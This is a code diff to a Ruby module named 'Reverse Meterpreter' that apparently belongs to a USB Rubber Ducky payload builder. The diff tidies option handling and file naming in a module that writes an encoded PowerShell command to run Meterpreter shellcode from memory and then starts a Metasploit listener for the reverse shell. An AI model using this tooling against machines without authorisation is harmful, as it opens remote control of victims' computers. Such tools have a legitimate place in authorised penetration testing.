@@ -2,7 +2,7 @@
 require 'skeleton'
 require 'metasploit'
 class ReverseMeterpreter < Skeleton
-  include Msf
+  include Msf::Options
   attr_reader :ducky
   self.title = 'Reverse Meterpreter'
   self.description = 'Execute Meterpreter shellcode from memory'
@@ -10,8 +10,8 @@ class ReverseMeterpreter < Skeleton
   def setup
     @msf = Msf::MsfCommands.new
     @payload = @msf.payload_select
-    @msf_host = @msf.host
-    @msf_post = @msf.port
+    @msf_host = msf_host
+    @msf_port = msf_port
   end
 
   def run
@@ -20,12 +20,12 @@ class ReverseMeterpreter < Skeleton
 
   def finish
     priv_choice = @ducky_writer.menu
-    File.open("#{text_path}#{self.class.title}.txt", 'w') do |f|
+    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
       f.write(@ducky_writer.write(priv_choice))
       f.write(powershell_command(
-              powershell_command2(@shellcode).encode_command))
+              encode_command(powershell_command2(@shellcode))))
     end
-    Ducky::Compile.new("#{self.class.title}.txt")
+    Ducky::Compile.new("#{@file_name}.txt")
     @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
   end
 
